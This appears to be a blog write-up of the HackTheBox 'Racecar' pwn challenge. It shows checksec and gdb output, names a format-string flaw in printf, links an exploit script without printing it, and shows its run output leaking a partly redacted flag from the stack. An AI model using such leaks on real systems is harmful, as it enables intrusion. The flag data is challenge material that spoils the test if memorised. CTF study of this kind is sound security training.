<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="nair0lf32 ">
<meta name="description" content="Simple pwn challenge they said
└──╼ $file racecar racecar: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c5631a370f7704c44312f6692e1da56c25c1863c, not stripped └──╼ $checksec racecar [*] Checking for new versions of pwntools To disable this functionality, set the contents of /home/nair0lf32/.cache/.pwntools-cache-3.9/update to &amp;#39;never&amp;#39; (old way). Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide): [update] interval=never [*] You have the latest version of Pwntools (4." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://nair0lf32.github.io/zer0ne/writeups/hackthebox/racecar/racecar/" />


    <title>
        
            Racecar :: Zer0ne  — welcome friend
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="https://nair0lf32.github.io/zer0ne/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">



    <link rel="apple-touch-icon" sizes="180x180" href="https://nair0lf32.github.io/zer0ne/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://nair0lf32.github.io/zer0ne/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://nair0lf32.github.io/zer0ne/favicon-16x16.png">
    <link rel="manifest" href="https://nair0lf32.github.io/zer0ne/site.webmanifest">
    <link rel="mask-icon" href="https://nair0lf32.github.io/zer0ne/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="https://nair0lf32.github.io/zer0ne/favicon.ico">
    <meta name="msapplication-TileColor" content="">


<meta itemprop="name" content="Racecar">
<meta itemprop="description" content="Simple pwn challenge they said
└──╼ $file racecar racecar: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c5631a370f7704c44312f6692e1da56c25c1863c, not stripped └──╼ $checksec racecar [*] Checking for new versions of pwntools To disable this functionality, set the contents of /home/nair0lf32/.cache/.pwntools-cache-3.9/update to &#39;never&#39; (old way). Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide): [update] interval=never [*] You have the latest version of Pwntools (4."><meta itemprop="datePublished" content="2022-09-20T15:03:31+01:00" />
<meta itemprop="dateModified" content="2022-09-20T15:03:31+01:00" />
<meta itemprop="wordCount" content="283"><meta itemprop="image" content="https://nair0lf32.github.io/zer0ne"/>
<meta itemprop="keywords" content="" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://nair0lf32.github.io/zer0ne"/>

<meta name="twitter:title" content="Racecar"/>
<meta name="twitter:description" content="Simple pwn challenge they said
└──╼ $file racecar racecar: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c5631a370f7704c44312f6692e1da56c25c1863c, not stripped └──╼ $checksec racecar [*] Checking for new versions of pwntools To disable this functionality, set the contents of /home/nair0lf32/.cache/.pwntools-cache-3.9/update to &#39;never&#39; (old way). Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide): [update] interval=never [*] You have the latest version of Pwntools (4."/>



    <meta property="og:title" content="Racecar" />
<meta property="og:description" content="Simple pwn challenge they said
└──╼ $file racecar racecar: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c5631a370f7704c44312f6692e1da56c25c1863c, not stripped └──╼ $checksec racecar [*] Checking for new versions of pwntools To disable this functionality, set the contents of /home/nair0lf32/.cache/.pwntools-cache-3.9/update to &#39;never&#39; (old way). Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide): [update] interval=never [*] You have the latest version of Pwntools (4." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://nair0lf32.github.io/zer0ne/writeups/hackthebox/racecar/racecar/" /><meta property="og:image" content="https://nair0lf32.github.io/zer0ne"/><meta property="article:section" content="writeups" />
<meta property="article:published_time" content="2022-09-20T15:03:31+01:00" />
<meta property="article:modified_time" content="2022-09-20T15:03:31+01:00" /><meta property="og:site_name" content="Zer0ne" />




    <meta property="article:section" content="HackTheBox" />



    <meta property="article:published_time" content="2022-09-20 15:03:31 &#43;0100 WAT" />










    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="https://nair0lf32.github.io/zer0ne/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">&gt;</span>
            <span class="logo__text">Zer0ne #</span>
            <span class="logo__cursor" style=
                  "
                   background-color:#0FF00D;
                   animation-duration:2s;">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="https://nair0lf32.github.io/zer0ne/about">About</a></li><li><a href="https://nair0lf32.github.io/zer0ne/posts">Blog</a></li><li><a href="https://nair0lf32.github.io/zer0ne/writeups">Writeups</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
 </svg></span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="https://nair0lf32.github.io/zer0ne/writeups/hackthebox/racecar/racecar/">Racecar</a></h2>

            
            
            

            <div class="post-content">
                <p>Simple <a href="https://nair0lf32.github.io/zer0ne/htb/racecar/racecar">pwn challenge</a> they said</p>
<pre tabindex="0"><code>└──╼ $file racecar
racecar: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c5631a370f7704c44312f6692e1da56c25c1863c, not stripped
</code></pre><pre tabindex="0"><code>└──╼ $checksec racecar
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/nair0lf32/.cache/.pwntools-cache-3.9/update to &#39;never&#39; (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] You have the latest version of Pwntools (4.7.0)
[*] &#39;/Racecar/racecar&#39;
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre><p>It is an easy one they said!</p>
<pre tabindex="0"><code>(gdb) info function
All defined functions:

Non-debugging symbols:
0x00000618  _init
0x00000650  strcmp@plt
...

0x00000929  banner
0x00000b93  setup
0x00000c02  race_type
0x00000c91  car_menu
0x00001082  info
0x000011d2  car_info
0x00001352  menu
0x000013e1  main

...

(gdb) disassemble main
Dump of assembler code for function main:
...
</code></pre><p>There is a format string vulnerability in <code>printf()</code> in the <code>race_menu</code> function</p>
<p>the flag is right in the stack so <a href="https://nair0lf32.github.io/zer0ne/htb/racecar/exploit.py">use this</a></p>
<pre tabindex="0"><code>└──╼ $python exploit.py
[+] Opening connection to 138.68.129.154 on port 31614: Done
/Racecar/exploit.py:8: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(&#34;Name&#34;)
[DEBUG] Sent 0x5 bytes:
    b&#39;Name\n&#39;
[DEBUG] Received 0x438 bytes:

...

b&#39;\n[*] Waiting for the race to finish...\x1b[1;32m\n\n[+] You won the race!! You get 100 coins!\n[+] Current coins: [169]\x1b[1;36m\n\n[!] Do you have anything to say to the press after your big victory?\n&gt; \x1b[0m&#39;
[*] Switching to interactive mode
[DEBUG] Received 0x116 bytes:

...

The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: 
57d6f1c0170565b8d858152612565b996c57d6f1c057d6f340---FLAG: 0x7b4254480x5f7968770x5f6431640x34735f310x745f33760x665f33680x5f67346c0x745f6e300x355f33680x6b6334740x7d213f ---
[*] Got EOF while reading in interactive
$  
</code></pre><p>Now <a href="https://nair0lf32.github.io/zer0ne/htb/racecar/decode.py">decode</a></p>
<pre tabindex="0"><code>└──╼ $python decode.py
b&#39;HTB{&#39;
b&#39;HTB{why_&#39;
b&#39;HTB{why_d1d_&#39;
b&#39;HTB{why_d1d_1_s4&#39;
...

b&#39;HTB{SIKE_REDACTED}\x00&#39;
</code></pre><p>How easy that was!</p>

            </div>
        </article>

        <hr />

        <div class="post-info">
            
            
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>

        <span class="tag"><a href="https://nair0lf32.github.io/zer0ne/categories/hackthebox/">HackTheBox</a></span>
        
    </p>

  		</div>
    </main>

            </div>

            
                <footer class="footer">
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2023</span>
            <span><a href="https://nair0lf32.github.io/zer0ne">nair0lf32</a></span>
            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
            <span><a href="https://nair0lf32.github.io/zer0ne/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
            
        </div>
    </div>
    
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
        </div>
    </div>
    
</footer>

            
        </div>

        



<script type="text/javascript" src="https://nair0lf32.github.io/zer0ne/bundle.min.bb2c6bc3ed452ca4759660e4020811f248bc2320081559e8a32d8b0092773852941133639d35e8370d03d3ddaa750b1edd6b343c5bd22a55d5bdeae8f648f49b.js" integrity="sha512-uyxrw&#43;1FLKR1lmDkAggR8ki8IyAIFVnooy2LAJJ3OFKUETNjnTXoNw0D092qdQse3Ws0PFvSKlXVvero9kj0mw=="></script>



    </body>
</html>
